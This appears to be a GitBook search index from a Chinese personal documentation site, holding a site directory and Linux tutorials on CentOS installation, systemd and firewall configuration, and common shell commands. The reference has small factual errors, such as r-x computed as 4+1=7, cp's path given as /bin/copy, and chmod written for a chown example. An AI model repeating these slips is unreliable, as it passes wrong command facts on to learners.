{"./":{"url":"./","title":"项目介绍","keywords":"","body":"星哥说事导航 项目名 正式域名 说明 开源仓库 星哥说事首页 www.xgss.net 基于wordpress搭建博客系统 静态资源图片等 s.xgss.net 蜘蛛采集的图片 看云-书籍 http://book.xgss.net/ 测试用的，看云空间只有50M，放弃了 图库 imgoss.xgss.net 主要用于图片存放，通过typora编写上传到阿里云oss上 owncloud云盘 o.xgss.net owncloud云盘 私人网盘 z.xgss.net 基于zfile搭建 gitbook gitbook.xgss.net gitbook.xgss.net CNAME解析到 funet8.github.io，服务器在github 私人文档库 g.xgss.net 本地编辑md文件，通过gitbook工具生成html文件，上传到腾讯云。 私人图片库 p.xgss.net 基于开源欧奥PicHome搭建，私人相册库 开源地址 开源短链接 d.xgss.net 基于开源nlsn.cf/1搭建，添加url地址 开源地址 开源yourls y.xgss.net 基于开源yourls搭建，添加url地址 开源地址 开源短链接-模板 d.xgss.net 基于开源nlsn.cf/1搭建，添加url地址 开源地址 青龙签到 ql.xgss.net 青龙面板每天自动获取京东豆 阿里云服务器优惠 | 腾讯云服务器优惠 好玩吧导航 项目名 正式域名 说明 开源仓库 好玩吧首页 www.funet8.com 基于wordpress搭建博客系统 好玩吧js js.funet8.com 网络云盘 d.funet8.com KodExplorer-开源云桌面 开源地址 微擎 we7.funet8.com 微擎项目 腾讯企业邮箱 腾讯企业邮箱 funet8.com的域名解析 蓝天采集器 sky.funet8.com 域名停解析，绑定hosts访问 开源地址 测试站 t.funet8.com 域名停解析，绑定hosts访问 wordpress 关于Gitbook gitbook常用命令 1.获取帮助 # gitbook --help 2.启动服务 # gitbook serve 可以访问： http://localhost:4000 3.安装插件 # gitbook install 4.生成静态文件 # gitbook build . 开源知识推荐 前端 jsliang 的文档库 运维 DevOps 知识图谱 bash-tutorial bash教程 官方网站 后端 JavaCollection | Java开源项目之「自学编程之路」 cdk8s-team-style | 寻找志同道合的人，引发自身的思考 bestJavaer | 这是一个成为更好的Java程序员的系列教程 27天成为Java大神 HelloGithub | 分享 GitHub 上有趣、入门级的开源项目 其他 程序员考公指南 超赞的 Linux 软件 | 一个 Linux 上超赞的应用，软件，工具以及其它资源的集中地 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-05-14 13:51:29 "},"doc/linux-basis/":{"url":"doc/linux-basis/","title":"Linux基础教程","keywords":"","body":"Linux基础教程 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-05-16 10:04:07 "},"doc/linux-basis/Linux.html":{"url":"doc/linux-basis/Linux.html","title":"Linux 介绍","keywords":"","body":"Linux 介绍 Linux 这个名字 Linux 的 Wiki 介绍：http://zh.wikipedia.org/zh/Linux Linux 也称：GNU/Linux，而其中 GNU 的全称又是：Gnu’s Not Unix。 其中 GNU 放前面是有原因的，GNU 介绍：http://zh.wikipedia.org/wiki/GNU 对于 Linux 和 GNU/Linux 的两种叫法是有争议，可以看下面文章：https://zh.wikipedia.org/wiki/GNU/Linux%E5%91%BD%E5%90%8D%E7%88%AD%E8%AD%B0 其实我们可以认为：Linux 本质是指 Linux 内核，而称 GNU/Linux 则代表这是一个系统，所以我认为 Debian 的这个叫法是合理的，但是确实有点不好念和记忆。所以普遍大家直接称作 Linux。 通过上面的全称和资料其实我们也就了解到，Linux 本质来源不是 Unix，但是它借鉴了 Unix 的设计思想，所以在系统业界上把这种和 Unix 是一致设计思想的系统归为：类 Unix 系统。 类 Unix 系统的介绍：https://zh.wikipedia.org/wiki/%E7%B1%BBUnix%E7%B3%BB%E7%BB%9F 类 Unix 系统，除了我们今天要讲的 Linux，还有大家熟知的 Mac OS X、FreeBSD（这两个是直接从 Unix 系发展过来的，所以相对 Linux 是比较地道的类 Unix 系统） FreeBSD 介绍：http://zh.wikipedia.org/zh/FreeBSD Mac OS X 介绍：http://zh.wikipedia.org/wiki/OS_X Linux 的发行版本 Linux 的 Wiki 中有这句话： 通常情况下，Linux 被打包成供个人计算机和服务器使用的 Linux 发行版，一些流行的主流 Linux 发布版，包括 Debian（及其派生版本 Ubuntu、Linux Mint）、Fedora（及其相关版本 Red Hat Enterprise Linux、CentOS）和 openSUSE、ArchLinux（这个是我补充的）等。 通过上面这句话我做了总结，我个人觉得应该这样分： Fedora、RHEL、Centos 是一个系，他们的区别：http://blog.csdn.net/tianlesoftware/article/details/5420569 Debian、Ubuntu 是一个系的，他们的区别直接看 Ubuntu 的 Wiki 就可以得知：http://zh.wikipedia.org/zh/Ubuntu ArchLinux 自己一个系：http://zh.wikipedia.org/wiki/Arch_Linux openSUSE 自己一个系：http://zh.wikipedia.org/wiki/OpenSUSE 根据用途可以再总结： Fedora 系业界一般用于做服务器 Debian 系业界一般用于桌面，移动端，TV这一类 ArchLinux 系，很轻量的Linux，适合有一定Linux基础，并且爱折腾的人使用，用它做桌面或是服务器都行。 OpenSuse 系，嘛，嗯…人气相对比较差，一般是服务器。 其实 Linux 的发行版本有太多了，我也只是简单说下常见的而已，具体可以看：http://zh.wikipedia.org/wiki/Linux%E5%8F%91%E8%A1%8C%E7%89%88%E5%88%97%E8%A1%A8 Linux 作用 为什么要用 Linux 系统？大家常看到的说法是这样的： Linux 是一个开源的，有潜力，安全，免费的操作系统 我觉得这几个点都比较虚， 特别是免费这东西，在景德镇应该算是最不值钱的东西。作为系统的上层使用者来讲，我们之所以喜欢某个操作系统就是因为它可以加快的你生产效率，提高产能。我推荐 Linux 也只是因为它适合常见的编程语言做开发环境，仅此一点。 所有，对此我的总结就是： 如果你是某种语言的开发者，你从事这个行业，不管你怎么学习下去，Linux 永远绕不开。从简单的各种语言开发，到后期的服务器部署，分布式，集群环境，数据库相关等，Linux 都在等着你。如果你是新手程序员可能还不太懂我这句话，但是我这里可以这样提示：你可以认真去看下各个语言的官网、对应的开发组件官网，看下他们的下载和新手上路相关页面，都会有 Linux 系统对应的介绍，但是不一定有会 Windows。（P.S：微软系、美工等设计系是唯一这个总结之外的人） 在认识 Linux 作用上我以下面这边文章为结尾。Linux 和 Mac OS X 都是类 Unix 系统，所以这篇文章中基本上的理由都可以用到 Linux 上的。 为什么国外程序员爱用 Mac？http://www.vpsee.com/2009/06/why-programmers-love-mac/ 推荐的发行版本 Ubuntu：适用于开发机 推荐版本：Ubuntu kylin 15.10 Ubuntu kylin 官网：http://cn.Ubuntu.com/desktop Ubuntu 英文官网：http://www.ubuntu.com Ubuntu 中文官网：http://www.ubuntu.org.cn 网易镜像：http://mirrors.163.com/ubuntu-releases/ 阿里云镜像：http://mirrors.aliyun.com/ubuntu-releases/ Ubuntu kylin 15.10 64 位镜像地址：http://cdimage.ubuntu.com/ubuntukylin/releases/15.10/release/ubuntukylin-15.10-desktop-amd64.iso 推荐理由： 我们是要在上面做开发的，不是要把他变成生活用机的，所以你认为自己尝试安装各种中文输入法很爽吗？自己尝试让国际 Ubuntu 版变成又一个符合国情的 kylin 很爽吗？真心别折腾这些没用的东西。就像我以前说的，大学老师让 Java 新手使用记事本写代码就是一种非常 shit 行为，不断地在 Windows 上用 cmd > javac 是毫无意义的。 CentOS：适用于服务器机 推荐版本：6.7 CentOS 官网：http://www.centos.org/download/ 网易镜像：http://mirrors.163.com/centos/ 阿里云镜像：http://mirrors.aliyun.com/centos/ CentOS 6.7 64 位镜像地址：http://mirrors.163.com/centos/6.7/isos/x86_64/CentOS-6.7-x86_64-bin-DVD1.iso 推荐理由： Fedora（CentOS、RHEL） 系，是在国内外，作为企业服务器的系统最多，没有之一。我在 Quora 和知乎上也搜索了下，基本上大家都是赞同这个观点的。 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/linux-basis/CentOS-7-Install.html":{"url":"doc/linux-basis/CentOS-7-Install.html","title":"CentOS 7 安装","keywords":"","body":"CentOS 7 安装 概括 本教程中主要演示了 VMware Workstation 下安装 CentOS 7.3 的过程。 首先需要下载 VMware软件和 Centos7的系统镜像。 VMware 下安装 CentOS 过程 VMware Workstation 的介绍和下载 官网：https://www.vmware.com/products/workstation wiki：https://zh.wikipedia.org/wiki/VMware_Workstation 百度 wiki：http://baike.baidu.com/view/555554.htm 百度云下载（64 位）：http://pan.baidu.com/s/1eRuJAFK 官网下载：http://www.vmware.com/products/workstation/workstation-evaluation 安装细节开始： 如上图，默认是最小安装，点击进去，选择桌面安装。 如上图，默认是自动分区，如果懂得分区，点击进去，进行手动分区，CentOS 7 少了主分区，逻辑分区的选择了。 如上图，root 密码必须设置，我习惯测试的时候是：123456 我没有创建用户，喜欢用 root 如上图，许可证必须点击进去勾选同意相关协议。 如上图，网络可以稍后在设置，主机名可以现在先填写 如上图右上角，一般我们都选择跳过 到此Ceonts7系统安装完成！ Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/linux-basis/CentOS6-and-CentOS7.html":{"url":"doc/linux-basis/CentOS6-and-CentOS7.html","title":"CentOS 6 和 CentOS 7 差异","keywords":"","body":"CentOS 6 和 CentOS 7 介绍 总体差异 想装回过去的一些工具 安装：yum install -y tree net-tools bind-utils tree sysstat vim-en* lrzsz NetworkManager-tui ntp ntpdate iftop tcpdump telnet traceroute 查看版本号/主机名 cat /etc/redhat-release cat /etc/hostname 常用配置差异 CentOS 网络配置 CentOS 图形界面的关闭与开启 systemctl 的用法 相当于 CentOS 6 的：service nginx stop systemctl is-enabled iptables.service #查询服务是否开机启动 systemctl enable iptables.service #开机运行服务 systemctl disable iptables.service #取消开机运行 systemctl start iptables.service #启动服务 systemctl stop iptables.service #停止服务 systemctl restart iptables.service #重启服务 systemctl reload iptables.service #重新加载服务配置文件 systemctl status iptables.service #查询服务运行状态 systemctl --failed #显示启动失败的服务 systemctl list-units --type=service #查看所有服务 systemctl is-enabled httpd #查看httpd服务是否开机启动 对于启动脚本的存放位置，也不再是 /etc/init.d/（这个目录也是存在的），而是 /usr/lib/systemd/system/ 开放端口 一般设置软件端口有一个原则： 0 ~ 1024 系统保留，一般不要用到 1024 ~ 65535（2^16） 可以随意用 添加单个端口：firewall-cmd --zone=public --add-port=8883/tcp --permanent 添加范围端口：firewall-cmd --zone=public --add-port=8883-8885/tcp --permanent 删除端口：firewall-cmd --zone=public --remove-port=8883/tcp --permanent 重启防火墙：firewall-cmd --reload 命令解释： --zone #作用域 --add-port=80/tcp #添加端口，格式为：端口/通讯协议 --permanent #永久生效，没有此参数重启后失效 列出所有端口列表：firewall-cmd --list-all 关闭 firewall 使用 iptables 关闭 firewall systemctl stop firewalld.service #停止firewall systemctl disable firewalld.service #禁止firewall开机启动 安装 iptables yum install -y iptables-services 启动 iptables systemctl restart iptables.service #最后重启防火墙使配置生效 systemctl enable iptables.service #设置防火墙开机启动 其他使用照旧 ifconfig 没有了 查看网络配置：ip a 装回 ifconfig：yum install -y net-tools 设置时区 timedatectl set-timezone Asia/Shanghai timedatectl status 资料 http://blog.topspeedsnail.com/archives/3017 http://chenbaocheng.com/2015/07/15/Centos-7-%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AEiptables/ http://cuidehua.blog.51cto.com/5449828/1858374 http://putty.biz/760 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/linux-basis/Linux常用命令及其使用详解.html":{"url":"doc/linux-basis/Linux常用命令及其使用详解.html","title":"Linux常用命令及其使用详解","keywords":"","body":"Linux系统常用命令及其使用详解大全 整理了linux常用的命令，最长常用的也就几十个，cd，ls ，vi等等，有些容易忘记，经常拿出来看看。 其他的可以推荐一个网站，https://www.linuxcool.com/ linux命令比较全 常用命令速记 su 不同用户切换 pwd 查看当前所在的目录 cd 用于打开一个目录 eg: 命令 含义 cd ／ 打开根目录 cd ／bin 打开根目录下的bin目录 cd bin 打开当前所在目录下的bin目录 cd .. 打开上一级目录 cd ../.. 打开上两极目录 cd /local/bin 打开根目录下local目录中的bin目录 cd ~ 打开用户的主目录 ls 查看目录命令 ls -a 显示所有文件及目录，包括隐藏文件 ls -l 显示文件的详细列表，显示文件名、文件形态、权限、拥有者、 文件大小等信息 ls -t 将文件依建立的时间先后排列显示 ls *.c 显示扩展名为 .c的文件 ls 0?.c 显示出第一个字符为 0，且扩展名为 .c的文件 说明：ls与其后的参数之间必须有空格隔开 touch 建立一个空文件 rm 删除一个文件 mkdir 建立一个空目录 mkdir -p a/b 在目录a中建立目录b rmdir 或 rm -r 删除一个目录 cp 复制文件 mv 文件移动和更名 wc 查看文件信息 wc -l 显示文件的文本行数 wc -w 显示文件的字数 wc -c 显示文件中的字符数 cat 输出文件的内容 cat -n 由1开始对所有输出的行进行编号 more 显示文件的内容 ／／两个命令所不同的是:cat把文件内容一直打印出来，而 more则分屏显示 head 和 tail 查看文件视图 eg: head -n5 查看文件的前5行 head 400b 查看文件的前400个字节 tail -n5 查看文件的后5行 find 查找文件命令 eg: find /root *.c 查找root目录中所有扩展名为.c的文件 grep 文本内容搜索 eg: grep success * 　　 /*查找当前目录下面所有文件里面含有success字符的文件 passwd 可以设置口令 history 用户用过的命令 !! 执行最近一次的命令 which 查询该命令所在目录 kill 杀掉一个进程 killall 杀掉进程 man Linux系统中标准帮助文档 info 自由软件的帮助手册 ／／ 在用法上man和info基本相同 reboot 重启命令 halt 关机命令 uname -a 查看系统内核 uname -r 查看系统内核 file /sbin/init 查看系统是32位还是64位 lsb_release -a ls 显示所有目录文件 英文名称：list 命令所在路径：/bin/ls -a 显示所有文件，包括隐藏文件 =all -l 详细信息显示 =long -d 查看目录文件 =directory 文件信息 drwxr-xr-x. 2 root root 4096 Jul 16 06:43 bin 第一个字母：d 代表目录=directory - 二级制文件 l 软连接文件link 【硬链接】 用户类型 r=read 读权限 w=write 写权限 x=execute 执行权限 rwx r-x r-x 【每三个部分是一个部分，代表一类用户】 第一类用户 第二类用户 第三类用户 所有者u 所属组g others user group onwer 硬连接数 所有者:root 所属组:root 文件大小，并不是准确目录大小，数据块block【512字节，可以调整大小】 时间值：创建时间或者是修改的时间。 文件名称。 cd切换目录 ​ 英文原意：change directory ​ 所在命令路径：shell内置命令 ​ 执行权限：所有用户 $cd / 切换到根目录 $cd ../ 回到上级目录 $cd /bin ​​ pwd显示当前所在的工作目录 英文原意：print working directory 所在命令路径：/bin/pwd 执行权限：所有用户 $pwd touch创建文件 ​ 英文原意：touch ​ 所在命令路径：/bin/touch ​ 执行权限：所有用户 ​ 语法：touch [目录名] mkdir创建目录 ​ 英文原意：make directories ​ 所在命令路径：/bin/mkdir ​ 执行权限：所有用户 ​ 语法：mkdir [目录名] ​ $mkdir newdir ​ cp复制文件或者目录 ​ 英文原意：copy ​ 所在命令路径：/bin/copy ​ 执行权限：所有用户 ​ 语法： cp -R [源文件或者目录] [目的目录] ​ -R 复制目录 【复制文件不需要加“-R”，复制文件目录需要】​ mv移动文件、剪切、更名 ​ 英文原意：move ​ 所在命令路径：/bin/mv ​ 执行权限：所有用户 ​ 语法：mv [源文件或者目录] [目的目录] ​ mv file1 file2 【把file1改名为file2】 ​ rm删除文件 ​ 英文原意：remove ​ 所在命令路径：/bin/rm ​ 执行权限：所有用户 ​ 语法：rm -r [文件或者目录] ​ -r 删除目录 【rmdir（删除空目录）】 ​ rm -f filename 【直接删除文件，不需要确认】 ​ rm -rf dirname 【直接删除文件夹】 ​ cat显示文件内容 不能分页显示，适用于文件内容较少的文件 英文原意：concatenate and display files ​ 所在命令路径：/bin/cat ​ 执行权限：所有用户 ​ 语法：cat [文件名] cat /etc/issue cat /etc/services more分页显示文件 ​ 所在命令路径：/bin/more ​ 执行权限：所有用户 ​ 语法：more [文件名] ​ （空格）或f ：显示下一页 ​ （回车）： 显示下一行 ​ q或Q 退出 more /etc/services head查看文件的前几行 ​ 所在命令路径：/bin/head ​ 执行权限：所有用户 ​ 语法： head -num [文件名] ​ head -20 /etc/services tail查看文件最后几行 ​ 所在命令路径：/bin/tail ​ 执行权限：所有用户 ​ 语法： tail -num [文件名] ​ -f 动态显示文件末尾内容 [监视日志文件，更新] ​ tail -20 /etc/services tail -f /var/log/messages ln产生链接文件 ​ 英文原意：link ​ 所在命令路径：/bin/ln ​ 执行权限：所有用户 ​ 语法： ln -s [源文件] [目标文件] ​ -s 创建软连接​ 软链接： ln -s /etc/issue /issue.soft 软连接文件权限都是lrwxrwxrwx 访问权限取决于源文件 【创建时间也跟源文件不同】 硬链接： ln /etc/issue /issue.hard 硬链接：文件权限相同 类似于windows 复制+同步更新 【有相同的i节点】 不能跨文件系统生成。【类似于windows 不能从c盘硬链接到D盘】 ls -i inode i节点 数字标识，linux文件内核处理数字标识。每个文件必须有个i节点。 ​ 权限处理命令 chmod 改变文件或者目录权限 ​ 英文原意：change the permissions mode of a file ​ 命令所在路径：/bin/chmod ​ 执行权限：所有用户 ​ 语法： chmod [{ugo}{+-=}{rwx}] [文件或者目录] ​ [mode=421] [文件或者目录] chmod u(所有者) +(增加) g(所属组) -(去掉) o(其他人) =(设置权限=) 实例： chmod u+x a.txt 通过数字的方式来授权 chmod 777 a.txt r对应4，w对应2，x对应1 rwx r-x r-- 权限值：754 7=4+2+1 5=4+0+1 4=4+0+0 代表字符 权限 对文件的含义 对目录的含义 r 读权限 可查看文件内容 可以列出目录中的内容 w 写权限 可以修改文件内容 可以在目录中创建、删除文件 x 执行权限 可以执行文件 可以进入目录 删除文件不是你对这个文件有写权限，而是你对这个文件目录有写权限。 chown改变文件或者目录的所有者 ​ 英文原意：change file ownership ​ 命令所在路径：/bin/chown ​ 执行权限：所有用户 ​ 语法：chown [用户] [文件或者目录] ​ 实例： chown nobody filename ：【改变文件夹filename的所有者为nobody】 chown [-R] uesrname:group filename 【-R 代表递归性修改】 ​ chgrp改变文件或者文件夹的所属组 ​ 英文原意：change file group ownership ​ 命令所在路径：/bin/chgrp ​ 执行权限：所有用户 ​ 语法：chgrp [用户组] [文件或者目录] ​ 实例：chgrp adm file1 ​​ umask查看默认权限 umask -S [root@vm_web1]# umask 0022 [root@vm_web1]# umask -S u=rwx,g=rx,o=rx 0022的意思是 【0代表特殊权限位，022代表用户权限位，权限掩码值。】 777-022=755 linux权限规则：缺省创建的文件不能授予可执行文件x 缺省创建文件夹权限是755，缺省创建文件权限是-rw-r--r-- 644 修改默认权限值 umask 027 ​ ​ 文件夹搜索命令 ​ which显示系统命令所在的目录 命令所在路径：/user/bin/which 执行权限：所有用户 语法： which [命令名称] 实例： which ls whereis ls会显示命令的帮助文档的路径。 find 查找文件或者目录 ​ 命令所在路径： /user/bin/find ​ 执行权限：所有用户 ​ 语法： find [搜索路径] [搜索关键字] 实例：（禁止在根目录下搜索） find /etc -name init 【根据文件名称查找】 find /etc -name init* find /etc -name init?? find / -size +204800 【根据文件大小查找】 find /home -user samlee 【根据文件所有者查找：samlee用户的文件】 【根据时间查找：c=change改变文件属性修改 a=access访问 m-modify文件内容被修改过】 1.天ctime 、atime 、mtime 2.分钟 cmin、amin、mmin find /etc -mmin -120 【表示120分钟之内那些文件被修改过】 【根据i节点查找】 find . -inum 16 【查找i节点为16的文件】 *匹配任意字符，包括0个字符。 ?匹配单个字符。 -size 文件夹大小 block数据块 512字节=0.5kb 100MB =102400KB =204800block 大于+ 小于- 连接符 -a 代表and逻辑与 -o or 逻辑或。 链接执行符 -exec {}\\; find ......-exec 命令 {}\\; find ..... -ok 命令 {}\\; 【ok需要询问】 '{}'代表find查找的结果，“\\”代表转义符，'；'表示结束。 find /etc -size +163840 -a -size -204800 【在etc下查找大于80MB小于100MB的文件】 find /etc -name inittab -exec ls -l {}\\; 【查找文件之后，再执行查看文件夹属性】 locate查找文件和目录，根据系统定期文件数据库搜索 英文原意：list files in databases 命令所在路径：/user/bin/locate 执行权限：所有用户 语法： locate [搜索关键字] 实例： locate file updatadb用来更新文件数据库 grep在文件中搜寻字符串匹配的行并输出 ​ 命令所在路径：/bin/grep ​ 执行权限：所有用户 ​ 语法： grep [指定字串] [源文件] 实例： grep ftp /etc/services 如果我们想找在当前目录www目录下查找所有文件中包含字符串\"centos\"内容的文件，我们可以用如下命令。 find www |xargs grep \"centos\" find /data/conf/sites-available |xargs grep \"sssss.com\" 如果我们想找在当前目录www目录下查找所有后缀为.php文件包含字符串\"dgdxs.com\"内容的文件，我们可以用如下命令。 find www -name \"*.php\" |xargs grep \"centos\" man获得帮助信息 ​ 英文原意：manual ​ 命令所在路径：/user/bin/man ​ 执行权限：所有用户 ​ 语法： [命令或者配置文件] ​ 实例： man ls man services man 1 passwd 【命令的帮助】 man 5 passwd 【配置文件的帮助】 ​ info获得帮助信息 ​ 英文原意：information ​ 命令所在路径：/user/bin/info ​ 执行权限：所有用户 ​ 语法: info [任何关键字] 实例： info ls whatis apropos makewhatis获得索引的简短说明信息 ​ 英文原意：search the whatis database for strings ​ 命令所在路径：/user/bin/whatis apropos /user/sbin/makewhatis ​ 执行权限：ALL User , All user ,root ​ 语法: whatis apropos [任何关键字] ​ 实例： whatis ls apropos fstab makewhatis 建立数据库 help查看shell内置命令的帮助 ls --help help cd help ls ​ 压缩解压命令 ​ gzip只能压缩文件 ​ 英文原意：GUN zip ​ 命令所在路径：/bin/gzip ​ 执行权限：所有用户 ​ 语法： gzip 选项[文件] ​ 压缩后文件格式： .gz ​ 实例： gzip filename 只能压缩文件，不能压缩目录。 不保留原文件。 gunzip gzip -d 【解压】 tar打包目录 命令所在路径：/bin/tar 执行权限：所有用户 语法： tar 选项[cvf][目录] -c 产生.tar打包文件 【必要选项】 -x 解压.tar文件 -v 显示详细信息 -f 指定压缩后文件名 【必要选项】 -z 打包同时压缩 压缩后文件格式：.tar.gz 实例： tar -zcvf dir1.tar.gz dir1/ 【压缩文件夹】 tar -zcvf dir1.tar.gz dir1.txt 【压缩文件】 tar -zxvf dir1.tar.gz 【解压文件】 ​​ zip压缩目录或文件，centos没有该命令 命令所在路径：/user/bin/zip 执行权限：所有用户 语法： zip 选项[-r] [压缩后文件格式] 实例： zip services.zip /etc/services 【压缩文件】 zip -r test.zip /test 【压缩目录】 unzip解压缩 unzip [压缩文件] unzip test.zip ​ bzip2压缩文件 压缩比强悍 语法： bzip2 选项 [-k] [文件名称] -k产生压缩，保留原文件 压缩后文件格式：.bz2 实例： bzip2 -k file2 bunzip2解压缩 网络通信指令 write向另外用户发送信息 以Ctrl+D作为结束】需要用户登录 ​ 语法： write [用户名] ​ 实例：write samlee​​ wall向所有用户广播信息 ​ 语法 wall [message] [文件名] ​ 实例： ​ wall Happy New Year! ping测试网络连通性 ​ 语法： ping 选项 IP地址​ 实例： ping 192.168.1.1 需要关注丢包率。packet loss ​ ping -c 3 192.168.1.1 【定义发送请求包的数量】 ping -s 60000 192.168.1.1 【定义icmp发送请求包大小】 ​ ifconfig查看网络设置信息 语法：ifconfig 选项[-a] [网卡设备标识] -a 显示所有网卡信息 实例：ifconfig -a ifconfig eth0 ​ 系统关机命令 shutdown关机 ​ 语法：shutdown [等待一段时间关机] ​ 实例：shutdown -h now 【马上关机】 ​​ reboot重启 ​ 语法：reboot ​​ shell应用技巧 命名别名 输入\\输出重定向 管道 命令连接符 命令替换符 命令补全： 键 补齐命令或文件名。命令历史： history 浏览用户输入命令历史。 !100 就可以执行第100条命令记录。 清屏： clear 或者 ctrl+l 删除内容： ctrl+u 命名别名 ​ 实例：​ alias copy=cp ​ alias xrm=\"rm -r\" 【定义一个组合，需要用双引号】 ​ unalias copy 【删除别名】 输入\\输出重定向： ​ shell对于每个进程预先定义3个文件描述字（0、1、2），分别对应于： ​ 0（STDIN）标准输入 ​ 1（STDOUT）标准输出 ​ 2（STDERR）标准错误输出 cp -R /user /backup/user.bak 2> /bak.error >>两个大于号是追加。 管道 ​ 将一个命令的输出传递个另一个命令，作为另一个命令的输入。 ​ 使用方法： ​ 命令1|命令2|命令3....|命令n ​ 实例： ls -l /etc | more ls -l /etc | grep init ls -l /etc | grep init | wc -l ;用分号间隔的各个命令按照顺序依次执行。 &&用两个连接符前后命令的执行存在逻辑与关系，只有&&前面的命令执行成功后，后面的命令才能被执行。 ||前后执行命令的执行存在逻辑或关系，只有||前面的命令执行失败后，它后面的命令才能执行。 命令替换符 `` 将一个命令的输出作为另一个命令的参数。 格式： 命令1 命令2 实例： ls -l `which touch` ​ 系统命令详解 　指令名称：cat 　使用权限：所有使用者 　使用方式：cat [-AbeEnstTuv] [--help] [--version] fileName 　说明：把档案串连接后传到基本输出（萤幕或加 > fileName 到另一个档案） 　参数： 　-n 或 --number 由 1 开始对所有输出的行数编号 　-b 或 --number-nonblank 和 -n 相似,只不过对于空白行不编号 　-s 或 --squeeze-blank 当遇到有连续两行以上的空白行,就代换为一行的空白行 　-v 或 --show-nonprinting 　范例： 　cat -n textfile1 > textfile2 把 textfile1 的档案内容加上行号后输入 textfile2 这个档案里 　cat -b textfile1 textfile2 >> textfile3 把 textfile1 和 textfile2 的档案内容加上行号（空白行不加）之后将内容附加到 textfile3 　指令名称:cd 　使用权限:所有使用者 　使用方式:cd [dirName] 　说明:变换工作目录至 dirName。 其中 dirName 表示法可为绝对路径或相对路径。若目录名称省略,则变换至使用者的 home directory (也就是刚 login 时所在的目录).另外,\"~\" 也表示为 home directory 的意思,\".\" 则是表示目前所在的目录,\"..\" 则表示目前目录位置的上一层目录。 　范例:跳到 /usr/bin/: 　cd /usr/bin 　跳到自己的 home directory: 　cd ~ 　跳到目前目录的上上两层: 　cd ../.. 　指令名称:chmod 　使用权限:所有使用者 　使用方式:chmod [-cfvR] [--help] [--version] mode file... 　说明:Linux/Unix 的档案存取权限分为三级:档案拥有者,群组,其他。利用 chmod 可以藉以控制档案如何被他人所存取。 　把计: 　mode:权限设定字串,格式如下:[ugoa...][[+-=][rwxX]...][,...],其中u 表示该档案的拥有者,g 表示与该档案的拥有者属于同一个群体(group)者,o 表示其他以外的人,a 表示这三者皆是。 + 表示增加权限,- 表示取消权限,= 表示唯一设定权限。 r 表示可读取,w 表示可写入,x 表示可执行,X 表示只有当该档案是个子目录或者该档案已经被设定过为可执行。 　 　 　-c:若该档案权限确实已经更改,才显示其更改动作 　 　 　-f:若该档案权限无法被更改也不要显示错误讯息 　 　 　-v:显示权限变更的详细资料 　 　 　-R:对目前目录下的所有档案与子目录进行相同的权限变更(即以递回的方式逐个变更) 　 　 　--help:显示辅助说明 　 　 　--version:显示版本 　 　 　范例 :将档案 file1.txt 设为所有人皆可读取: 　 　 　chmod ugo+r file1.txt 　将档案 file1.txt 设为所有人皆可读取: 　chmod a+r file1.txt 　将档案 file1.txt 与 file2.txt 设为该档案拥有者,与其所属同一个群体者可写入,但其他以外的人则不可写入: 　chmod ug+w,o-w file1.txt file2.txt 　将 ex1.py 设定为只有该档案拥有者可以执行: 　chmod u+x ex1.py 　将目前目录下的所有档案与子目录皆设为任何人可读取: 　chmod -R a+r * 　此外chmod也可以用数字来表示权限如 chmod 777 file 　语法为：chmod abc file 　其中a,b,c各为一个数字,分别表示User,Group,及Other的权限。 　r=4,w=2,x=1 　若要rwx属性则4+2+1=7； 　若要rw-属性则4+2=6； 　若要r-x属性则4+1=7。 　范例： 　chmod a=rwx file 　和 　chmod 777 file 　效果相同 　chmod ug=rwx,o=x file 　和 　chmod 771 file 　效果相同 　若用chmod 4755 filename可使此程式具有root的权限 　指令名称:chown 　使用权限:root 　使用方式:chmod [-cfhvR] [--help] [--version] user[:group] file... 　说明:Linux/Unix 是多人多工作业系统,所有的档案皆有拥有者。利用 chown 可以将档案的拥有者加以改变。一般来说,这个指令只有是由系统管理者(root)所使用,一般使用者没有权限可以改变别人的档案拥有者,也没有权限可以自己的档案拥有者改设为别人。只有系统管理者(root)才有这样的权限。 　把计: 　user:新的档案拥有者的使用者 IDgroup:新的档案拥有者的使用者群体(group)-c:若该档案拥有者确实已经更改,才显示其更改动作-f:若该档案拥有者无法被更改也不要显示错误讯息-h:只对于连结(link)进行变更,而非该 link 真正指向的档案-v:显示拥有者变更的详细资料-R:对目前目录下的所有档案与子目录进行相同的拥有者变更(即以递回的方式逐个变更)--help:显示辅助说明--version:显示版本 　范例: 　将档案 file1.txt 的拥有者设为 users 群体的使用者 jessie: 　chown jessie:users file1.txt 　将目前目录下的所有档案与子目录的拥有者皆设为 users 群体的使用者 lamport: 　chmod -R lamport:users * 　指令名称：cp 使用权限：所有使用者 　使用方式： 　cp [options] source dest 　cp [options] source... directory 　说明：将一个档案拷贝至另一档案,或将数个档案拷贝至另一目录。 　把计: 　-a 尽可能将档案状态,权限等资料都照原状予以复制。 　-r 若 source 中含有目录名,则将目录下之档案亦皆依序拷贝至目的地。 　-f 若目的地已经有相同档名的档案存在,则在复制前先予以删除再行复制。 　范例： 　将档案 aaa 复制(已存在),并命名为 bbb: 　cp aaa bbb 　将所有的C语言程式拷贝至 Finished 子目录中: 　cp *.c Finished 　指令名称：cut 使用权限：所有使用者 　用法：cut -cnum1-num2 filename 　说明：显示每行从开头算起 num1 到 num2 的文字。 　范例： 　shell>> cat example 　test2 　this is test1 　shell>> cut -c0-6 example ## print 开头算起前 6 个字元 　test2 　this i find 　使用说明: 　将档案系统内符合 expression 的档案列出来。你可以指要档案的名称,类别,时间,大小,权限等不同资讯的组合,只有完全相符的才会被列出来。 　find 根据下列规则判断 path 和 expression,在命令列上第一个 - ( ) , ! 之前的部份为 path,之后的是 expression。如果 path 是空字串则使用目前路径,如果 expression 是空字串则使用 -print 为预设 expression 　expression 中可使用的选项有二三十个之多,在此只介绍最常用的部份。 　-mount, -xdev:只检查和指定目录在同一个档案系统下的档案,避免列出其它档案系统中的档案 　-amin n:在过去 n 分钟内被读取过 　-anewer file:比档案 file 更晚被读取过的档案 　-atime n:在过去 n 天过读取过的档案 　-cmin n:在过去 n 分钟内被修改过 　-cnewer file :比档案 file 更新的档案 　-ctime n:在过去 n 天过修改过的档案 　-empty:空的档案-gid n or -group name:gid 是 n 